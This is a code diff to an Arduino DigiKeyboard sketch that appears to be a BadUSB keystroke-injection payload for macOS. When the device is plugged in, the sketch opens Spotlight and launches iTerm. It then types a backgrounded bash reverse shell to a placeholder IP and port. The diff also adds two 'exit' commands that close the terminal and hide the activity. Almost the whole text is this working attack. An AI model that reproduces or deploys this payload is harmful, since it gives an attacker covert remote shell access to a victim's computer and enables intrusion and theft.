@@ -5,10 +5,11 @@ void setup()
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(500);
 
-  // command + space 调出 spotlight
+  // call spotlight
   DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
   DigiKeyboard.delay(2000);
 
+  // open terminal
   DigiKeyboard.print("iterm");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2000);
@@ -17,11 +18,18 @@ void setup()
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2000);
 
-  // 反弹shell
-  DigiKeyboard.print("bash -i >& /dev/tcp/{ip}/{port} 0>&1");
-  DigiKeyboard.delay(2000);
-  
+  // reverse shell
+  DigiKeyboard.print("bash -i >& /dev/tcp/{ip}/{port} 0>&1&");  
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+
+  // exit
+  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);  
 
   // initialize the digital pin as an output.
   pinMode(0, OUTPUT); //LED on Model B
